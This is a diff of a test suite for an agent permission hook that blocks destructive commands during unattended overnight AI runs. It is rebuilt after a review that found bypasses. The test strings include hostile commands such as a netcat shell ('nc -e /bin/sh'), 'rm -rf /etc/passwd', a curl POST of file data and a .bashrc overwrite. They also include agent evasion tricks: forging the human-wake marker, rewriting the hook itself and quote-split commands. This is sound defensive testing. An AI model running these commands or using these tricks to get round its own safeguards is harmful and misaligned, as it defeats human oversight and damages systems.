@@ -9,16 +9,18 @@ import { generateHooks } from '../generators/hooks-generator.js';
 import { getProjectPaths } from '../utils/paths.js';
 import { loadSwarmConfig } from '../utils/config.js';
 
-// Process-spawn tests for the NIGHT FLOOR (D-034, phase5 Stream S). This is the
-// SECURITY-CRITICAL wall: while a /sleep charter is open it must deny the
-// destructive/irreversible set for every agent, fail closed on a corrupt charter,
-// and never falsely deny reversible night work. Each attack class below maps to a
-// failure mode in diverge-overnight §6 / the security-review checklist (§10.2).
+// Process-spawn tests for the NIGHT FLOOR (D-034, phase5 Stream S) — rebuilt
+// FAIL-CLOSED after security-night-2026-08-13 (NF-1..NF-7). Every bypass the
+// review proved is re-tested as a DENY here; reversible night work still passes.
+// The teammate allowlist is scoped to teammate identities (agent_id present); the
+// absolute floors (never-merge/push, no-.claude-write, no-out-of-tree, no eval)
+// apply to every identity including the orchestrator.
 
 const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
 const REAL_RECORD = join(REPO_ROOT, 'bin', 'record.cjs');
+const NONCE = 'deadbeefcafe1234deadbeefcafe1234';
 
-describe('night-floor.cjs', () => {
+describe('night-floor.cjs (fail-closed)', () => {
   const tmpDir = mkdtempSync(join(tmpdir(), 'night-floor-'));
   const projectDir = join(tmpDir, 'project');
   let hooksDir;
@@ -31,8 +33,8 @@ describe('night-floor.cjs', () => {
     mkdirSync(deliveryDir, { recursive: true });
     mkdirSync(join(projectDir, '.claude', 'hooks'), { recursive: true });
     mkdirSync(join(projectDir, 'bin'), { recursive: true });
+    mkdirSync(join(projectDir, 'src'), { recursive: true });
     writeFileSync(join(projectDir, 'swarm.yaml'), 'project:\n  name: night-test\n');
-    // record.cjs present so the red-banner logging path is exercised for real.
     copyFileSync(REAL_RECORD, join(projectDir, 'bin', 'record.cjs'));
     const config = loadSwarmConfig(join(projectDir, 'swarm.yaml'));
     const paths = getProjectPaths(projectDir);
@@ -41,23 +43,21 @@ describe('night-floor.cjs', () => {
   });
   after(() => { rmSync(tmpDir, { recursive: true, force: true }); });
 
-  // --- charter helpers -----------------------------------------------------
   function arm({ endsInMs = 9 * 3600e3, graceMs = 7200000, extraDeny = [], noEpoch = false } = {}) {
     const endsEpoch = Date.now() + endsInMs;
     const xd = extraDeny.length ? '[' + extraDeny.map((s) => JSON.stringify(s)).join(', ') + ']' : '[]';
-    const fm = [
+    writeFileSync(charterFile, [
       '---', 'night_charter:', '  schema: night-charter/1',
       noEpoch ? '  ends: soon' : `  ends_epoch_ms: ${endsEpoch}`,
-      `  grace_ms: ${graceMs}`, `  extra_deny: ${xd}`, '  status: open', '---', '', '# charter', '',
-    ].join('\n');
-    writeFileSync(charterFile, fm);
+      `  wake_nonce: ${NONCE}`, `  grace_ms: ${graceMs}`, `  extra_deny: ${xd}`, '  status: open', '---', '', '# charter', '',
+    ].join('\n'));
     writeFileSync(pointer, 'night-charter-test.md\n');
     rmSync(wakeMarker, { force: true });
   }
   function disarm() { rmSync(pointer, { force: true }); rmSync(charterFile, { force: true }); rmSync(wakeMarker, { force: true }); }
 
-  function run(toolInput, extraEvent = {}) {
-    const event = { tool_input: toolInput, cwd: projectDir, ...extraEvent };
+  function run(toolInput, { teammate = true, ...ev } = {}) {
+    const event = { tool_input: toolInput, cwd: projectDir, ...(teammate ? { agent_id: 'dev-1', agent_type: 'developer' } : {}), ...ev };
     const r = spawnSync('node', [join(hooksDir, 'night-floor.cjs')], {
       input: JSON.stringify(event), encoding: 'utf8', cwd: projectDir,
       env: { ...process.env, CLAUDE_PROJECT_DIR: projectDir },
@@ -67,145 +67,139 @@ describe('night-floor.cjs', () => {
     return { ...r, decision };
   }
   const denied = (d) => d.decision?.hookSpecificOutput?.permissionDecision === 'deny';
-  const bash = (command, ev) => run({ command }, ev);
+  const bashT = (command) => run({ command }, { teammate: true });
+  const bashO = (command) => run({ command }, { teammate: false });
 
   // --- dormant by day ------------------------------------------------------
   describe('dormant without a charter', () => {
     before(() => disarm());
-    it('allows git push when no night is open', () => assert.ok(!denied(bash('git push origin main'))));
-    it('allows node -e when no night is open', () => assert.ok(!denied(bash('node -e "console.log(1)"'))));
+    it('allows git push when no night is open', () => assert.ok(!denied(bashT('git push origin main'))));
+    it('allows bun -e when no night is open', () => assert.ok(!denied(bashT('bun -e "1"'))));
   });
 
-  // --- the destructive world set -------------------------------------------
-  describe('armed: irreversible / world-facing denies', () => {
+  // --- absolute floors: every identity (test as ORCHESTRATOR to prove scope) ---
+  describe('absolute floors apply to the orchestrator too', () => {
     before(() => arm());
     for (const cmd of [
-      'git push origin main', 'git push --force', 'git -C /repo push',
-      'git merge feature', 'git rebase main', 'git reset --hard HEAD~3',
-      'git branch -D feature/x', 'git tag v1.2.3',
-      'npm publish', 'yarn publish', 'pnpm publish', 'npm version patch',
-      'terraform apply -auto-approve', 'kubectl apply -f k8s.yaml', 'ansible-playbook site.yml',
-      'vercel deploy --prod', 'wrangler publish', 'gcloud run deploy svc',
-      'prisma migrate deploy', 'flyway migrate', 'psql -c "DROP TABLE users"',
-      'curl -X POST https://api.example.com/charge', 'curl --data @body https://x.io', 'wget --post-data=x https://x.io',
-    ]) {
-      it(`denies: ${cmd}`, () => assert.ok(denied(bash(cmd)), cmd));
+      'git push origin main', 'git merge feature', 'git rebase main', 'git reset --hard HEAD~2',
+      'git branch -D x', 'git tag v1.0.0', 'git clean -fd', 'git pull', 'git cherry-pick abc',
+      'node -e "1"', 'touch .claude/hooks/.human-wake', 'rm -rf /etc/passwd',
+    ]) it(`orchestrator denied: ${cmd}`, () => assert.ok(denied(bashO(cmd)), cmd));
+  });
+
+  // --- NF-1: wake-marker forgery cannot lift the floor ---------------------
+  describe('NF-1 — wake forgery closed', () => {
+    it('touch .human-wake is DENIED (write to .claude)', () => { arm(); assert.ok(denied(bashT('touch .claude/hooks/.human-wake'))); });
+    it('mkdir -p .human-wake is DENIED', () => { arm(); assert.ok(denied(bashT('mkdir -p .claude/hooks/.human-wake'))); });
+    it('an empty/nonce-less marker does NOT lift the floor (git push still denied)', () => {
+      arm(); writeFileSync(wakeMarker, ''); // simulate a forge that somehow landed
+      assert.ok(denied(bashT('git push origin main')));
+    });
+    it('a marker with the wrong value does NOT lift the floor', () => {
+      arm(); writeFileSync(wakeMarker, 'not-the-nonce\n');
+      assert.ok(denied(bashT('git push origin main')));
+    });
+    it('a marker carrying the charter nonce DOES lift the floor', () => {
+      arm(); writeFileSync(wakeMarker, NONCE + ' 2026-08-13T06:00:00Z\n');
+      assert.ok(!denied(bashT('git push origin main')));
+    });
+  });
+
+  // --- NF-2: self-legislation via cwd-relative + realpath ------------------
+  describe('NF-2 — self-legislation closed (cwd-resolved)', () => {
+    before(() => arm());
+    it('cd .claude && printf > hooks/night-floor.cjs is DENIED', () => assert.ok(denied(bashT('cd .claude && printf x > hooks/night-floor.cjs'))));
+    it('cd artifacts/delivery && echo > charter is DENIED', () => assert.ok(denied(bashT('cd artifacts/delivery && echo x > night-charter-test.md'))));
+    it('a redirect into .claude/ is DENIED', () => assert.ok(denied(bashT('echo x > .claude/settings.json'))));
+    it('tee into a hook is DENIED', () => assert.ok(denied(bashT('echo x | tee .claude/hooks/night-floor.cjs'))));
+    it('sed -i on a hook is DENIED', () => assert.ok(denied(bashT('sed -i s/a/b/ .claude/hooks/night-floor.cjs'))));
+    it('Edit tool to a hook is DENIED', () => assert.ok(denied(run({ file_path: '.claude/hooks/night-floor.cjs' }))));
+    it('Write tool to the charter is DENIED', () => assert.ok(denied(run({ file_path: 'artifacts/delivery/night-charter-test.md' }))));
+    it('Write tool to the pointer is DENIED', () => assert.ok(denied(run({ file_path: 'artifacts/delivery/.night-charter-current' }))));
+  });
+
+  // --- NF-3: quote/concat evasion closed -----------------------------------
+  describe('NF-3 — quote/concat evasion closed', () => {
+    before(() => arm());
+    for (const cmd of ['git p""ush origin main', 'g""it push origin main', 'npm pub""lish', 'rm -rf "/etc/passwd"', "git 'push' origin main"]) {
+      it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
     }
   });
 
-  // --- interpreter escapes (the §2.1 teammate residual + wrapper classes) ---
-  describe('armed: interpreter-escape denies (incl. wrappers)', () => {
+  // --- NF-4: out-of-tree deletion closed -----------------------------------
+  describe('NF-4 — out-of-tree deletion closed', () => {
     before(() => arm());
     for (const cmd of [
-      'node -e "require(\'fs\')"', 'node --eval "1"', 'node -p "process.env"', 'nodejs -e "1"',
-      'npx cowsay hi', 'python -c "import os"', 'python3 -c "1"', 'perl -e "print 1"', 'ruby -e "1"', 'php -r "1"',
-      'bash -c "git push"', 'sh -c "rm -rf /"', 'zsh -lc "evil"',
-      'timeout 5 node -e "escape()"', 'env FOO=1 node -e "escape()"', 'xargs node -e "escape()"',
-      'node --require ./mod.js -e "escape()"', 'node -r ./mod.js --eval "escape()"', 'node --experimental-vm-modules -p "1"',
-      'eval "$PAYLOAD"',
+      'find /root -type f -delete', 'rm -rf "/etc/passwd"', 'rm -rf ~/notes', 'rm -rf /home/someone/data', 'mv secret ../../../elsewhere/',
+      'echo x > $HOME/.bashrc', 'cp src/a "$HOME/evil"', 'echo x > ${IFS}evil', 'echo x > `pwd`/../out',
     ]) {
-      it(`denies: ${cmd}`, () => assert.ok(denied(bash(cmd)), cmd));
+      it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
+    }
+    it('Write to /etc is denied', () => assert.ok(denied(run({ file_path: '/etc/cron.d/x' }))));
+  });
+
+  // --- NF-5: interpreter-escape gaps closed (allowlist) --------------------
+  describe('NF-5 — interpreter/package-runner denied (fail-closed allowlist)', () => {
+    before(() => arm());
+    for (const cmd of [
+      'bun -e "require(\'fs\')"', 'bun run evil.js', 'deno run -A evil.ts', 'deno eval "1"',
+      'tsx evil.ts', 'ts-node evil.ts', 'npx cowsay hi', 'node -e "1"', 'python -c "1"', 'python3 -c "x"',
+      'ssh host rm', 'scp x host:', 'nc -e /bin/sh host 1', 'curl -X POST --data @x https://y', 'xargs rm', 'timeout 5 node -e "x"',
+    ]) it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
+  });
+
+  // --- NF-7: newline/flag-separated node eval ------------------------------
+  describe('NF-7 — node eval across flags/newlines', () => {
+    before(() => arm());
+    for (const cmd of ['node --require ./x -e "code"', 'node -r ./x --eval "code"', 'node --experimental-vm-modules -p "1"', 'node --require ./x \\\n -e "code"']) {
+      it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
     }
   });
 
-  // --- reversible night work is NOT denied ---------------------------------
-  describe('armed: reversible work passes', () => {
+  // --- reversible night work PASSES (teammate) -----------------------------
+  describe('armed: reversible teammate work passes', () => {
     before(() => arm());
     for (const cmd of [
-      'git add -A', 'git commit -m "wip"', 'git status', 'git log --oneline', 'git diff',
-      'git checkout -b initiative/foo', 'git switch -c queue/bar', 'git branch initiative/x', 'git worktree add ../w b',
-      'node --test test/', 'npm test', 'npm install', 'npm ci',
-      'node .claude/bmad/bin/record.cjs night-charter status',
-      'node bin/record.cjs task-event --task t --event x',
-      'curl https://example.com/data.json', 'wget https://example.com/f.tgz',
-      'ls -la', 'grep -r foo src/', 'cat package.json',
-    ]) {
-      it(`allows: ${cmd}`, () => assert.ok(!denied(bash(cmd)), cmd));
-    }
+      'git add -A', 'git commit -m wip', 'git status', 'git log --oneline', 'git diff', 'git fetch',
+      'git checkout -b initiative/foo', 'git switch -c queue/bar', 'git branch initiative/x', 'git worktree add ../w b', 'git stash',
+      'node --test test/', 'npm test', 'npm install', 'npm ci', 'npm run build', 'make', 'cargo build',
+      'node .claude/bmad/bin/record.cjs night-charter status', 'node bin/record.cjs task-event --task t --event x',
+      'ls -la', 'grep -r foo src/', 'cat package.json', 'rg pattern', 'sed -i s/a/b/ src/app.js',
+      'mkdir -p src/new', 'touch src/new.js', 'rm -rf node_modules/.cache', 'cp src/a.js src/b.js', 'echo hi > src/out.txt',
+    ]) it(`allows: ${cmd}`, () => assert.ok(!denied(bashT(cmd)), cmd));
+    it('allows an in-tree source Edit', () => assert.ok(!denied(run({ file_path: 'src/app.js' }))));
+    it('allows an artifacts Edit', () => assert.ok(!denied(run({ file_path: 'artifacts/implementation/notes.md' }))));
   });
 
-  // --- self-legislation ----------------------------------------------------
-  describe('armed: no self-legislation', () => {
-    before(() => arm());
-    it('denies Edit to a hook file', () => assert.ok(denied(run({ file_path: '.claude/hooks/night-floor.cjs' }))));
-    it('denies Edit anywhere under .claude/', () => assert.ok(denied(run({ file_path: '.claude/settings.json' }))));
-    it('denies Edit to the charter file', () => assert.ok(denied(run({ file_path: 'artifacts/delivery/night-charter-test.md' }))));
-    it('denies Edit to the pointer', () => assert.ok(denied(run({ file_path: 'artifacts/delivery/.night-charter-current' }))));
-    it('denies Write to the human-wake marker (agent cannot forge the wake)', () => assert.ok(denied(run({ file_path: '.claude/hooks/.human-wake' }))));
-    it('denies a Bash redirect into .claude/', () => assert.ok(denied(bash('echo x > .claude/hooks/.human-wake'))));
-    it('denies a Bash redirect into the charter', () => assert.ok(denied(bash('echo "ends_epoch_ms: 0" > artifacts/delivery/night-charter-test.md'))));
-    it('denies sed -i on a hook', () => assert.ok(denied(bash('sed -i s/a/b/ .claude/hooks/night-floor.cjs'))));
-    it('allows an ordinary source edit', () => assert.ok(!denied(run({ file_path: 'src/app.js' }))));
-    it('allows an artifacts edit (reversible night output)', () => assert.ok(!denied(run({ file_path: 'artifacts/implementation/notes.md' }))));
-  });
-
-  // --- out-of-tree writes / deletes ----------------------------------------
-  describe('armed: out-of-tree escape denies', () => {
-    before(() => arm());
-    it('denies Write to an absolute path outside the tree', () => assert.ok(denied(run({ file_path: '/etc/passwd' }))));
-    it('denies Write under another home', () => assert.ok(denied(run({ file_path: '/home/someone/.bashrc' }))));
-    it('denies rm of an absolute out-of-tree path', () => assert.ok(denied(bash('rm -rf /home/someone/data'))));
-    it('denies rm targeting ~', () => assert.ok(denied(bash('rm -rf ~/notes'))));
-    it('denies mv escaping via ..', () => assert.ok(denied(bash('mv secret.txt ../../../elsewhere/'))));
-    it('allows rm inside the worktree', () => assert.ok(!denied(bash('rm -rf node_modules/.cache'))));
-    it('allows a relative in-tree write', () => assert.ok(!denied(run({ file_path: 'test/new.test.js' }))));
-  });
-
-  // --- charter extra_deny (append-only narrowing) --------------------------
+  // --- charter extra_deny ---------------------------------------------------
   describe('armed: charter extra_deny narrows further', () => {
-    before(() => arm({ extraDeny: ['npm install', 'mass-rename'] }));
-    after(() => arm()); // reset to a plain charter for later suites
-    it('denies a command matching an extra_deny substring', () => assert.ok(denied(bash('npm install left-pad'))));
-    it('still allows unrelated work', () => assert.ok(!denied(bash('git commit -m x'))));
+    before(() => arm({ extraDeny: ['left-pad'] }));
+    after(() => arm());
+    it('denies a command matching an extra_deny substring', () => assert.ok(denied(bashT('npm install left-pad'))));
+    it('still allows unrelated work', () => assert.ok(!denied(bashT('git commit -m x'))));
   });
 
-  // --- FAIL CLOSED ---------------------------------------------------------
+  // --- fail-closed charter --------------------------------------------------
   describe('fail-closed on a corrupt charter', () => {
-    it('dangling pointer (charter deleted) → still denies git push', () => {
-      arm(); rmSync(charterFile, { force: true });
-      assert.ok(denied(bash('git push origin main')));
-    });
-    it('charter with no ends_epoch_ms → still denies git push', () => {
-      arm({ noEpoch: true });
-      assert.ok(denied(bash('git push origin main')));
-    });
-    it('pointer with a traversal basename → fails closed', () => {
-      writeFileSync(pointer, '../../../etc/evil\n');
-      assert.ok(denied(bash('git push origin main')));
-      arm();
-    });
+    it('dangling pointer → denies git push', () => { arm(); rmSync(charterFile, { force: true }); assert.ok(denied(bashT('git push'))); });
+    it('no ends_epoch_ms → denies git push', () => { arm({ noEpoch: true }); assert.ok(denied(bashT('git push'))); });
+    it('pointer traversal basename → fails closed', () => { writeFileSync(pointer, '../../../etc/evil\n'); assert.ok(denied(bashT('git push'))); arm(); });
   });
 
-  // --- the floor lifts correctly -------------------------------------------
-  describe('floor lifts on wake / grace', () => {
-    it('human-wake marker present → floor lifts (human is driving)', () => {
-      arm(); writeFileSync(wakeMarker, 'human');
-      assert.ok(!denied(bash('git push origin main')));
-      rmSync(wakeMarker, { force: true });
-    });
-    it('past ends + grace → floor lifts', () => {
-      arm({ endsInMs: -3 * 3600e3, graceMs: 3600e3 }); // ended 3h ago, 1h grace → lifted
-      assert.ok(!denied(bash('git push origin main')));
-    });
-    it('past ends but WITHIN grace → still armed', () => {
-      arm({ endsInMs: -10 * 60e3, graceMs: 3600e3 }); // ended 10m ago, 1h grace → armed
-      assert.ok(denied(bash('git push origin main')));
-    });
+  // --- floor lifts ----------------------------------------------------------
+  describe('floor lifts on grace', () => {
+    it('past ends + grace → lifts', () => { arm({ endsInMs: -3 * 3600e3, graceMs: 3600e3 }); assert.ok(!denied(bashT('git push'))); });
+    it('past ends but within grace → still armed', () => { arm({ endsInMs: -10 * 60e3, graceMs: 3600e3 }); assert.ok(denied(bashT('git push'))); });
   });
 
-  // --- every identity + red-banner logging ---------------------------------
-  describe('coverage: identity + logging', () => {
-    it('denies for a teammate identity too (agent_id present)', () => {
+  // --- red-banner logging ---------------------------------------------------
+  describe('red-banner logging', () => {
+    it('writes a night-floor denied row to the task-ledger on deny', () => {
       arm();
-      assert.ok(denied(bash('git push', { agent_id: 'dev-1', agent_type: 'developer' })));
-    });
-    it('writes a red-banner row to the task-ledger on deny', () => {
-      arm();
-      bash('git push origin main');
+      bashT('git push origin main');
       const ledger = join(projectDir, 'artifacts', 'context', 'task-ledger.md');
-      assert.ok(existsSync(ledger), 'task-ledger written by the deny');
-      const text = readFileSync(ledger, 'utf8');
-      assert.match(text, /task=night-floor event=denied/);
+      assert.ok(existsSync(ledger), 'task-ledger written');
+      assert.match(readFileSync(ledger, 'utf8'), /task=night-floor event=denied/);
     });
   });
 });
